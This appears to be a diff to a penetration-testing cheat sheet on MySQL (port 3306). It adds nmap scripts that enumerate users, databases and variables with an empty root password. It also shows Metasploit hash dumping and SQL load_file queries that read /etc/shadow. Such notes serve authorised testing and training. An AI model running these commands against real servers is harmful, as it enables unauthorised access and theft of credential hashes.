@@ -34,18 +34,32 @@ description: >-
 
 ## Enum
 
-```bash
-# Default scan
+<pre class="language-bash"><code class="lang-bash"># Default scan
 nmap $IP -sV -p 3306 
 
-# empty password script
+# Empty password script
 nmap $IP -sV -p 3306 --script-empty-password
 
-#Get Mysql info
-nmap $IP -sV -p 3306 --script-info
+<strong># Get Mysql info
+</strong>nmap $IP -sV -p 3306 --script-info
+
+# Get mysql users
+nmap $IP -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
+
+<strong># Get mysql databases
+</strong>nmap $IP -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
+
+# Get mysql variables
+nmap $IP -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
+
+# mysql audit
+nmap $IP -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
 
 # Try to connect directly without a password
 mysql -h $IP -u root
+
+# Run query
+nmap $IP -sV -p 3306 --script=mysql-query --script-args="query='select load_file("/etc/shadow");',mysqluser='root',mysqlpass=''"
 
 # Metasploit way
 msfconsole
@@ -60,15 +74,16 @@ use auxiliary/scanner/mysql/mysql_hashdump
 setg rhosts $IP
 set username root
 set password ""
-run
-```
+run</code></pre>
 
-#### Access local files via db
+#### Manipulate local files via db
 
 ```sql
 # connect to instance
 mysql -h $IP -u root
 
-# run query
+# read local file
 select load_file("/etc/shadow");
+
+
 ```
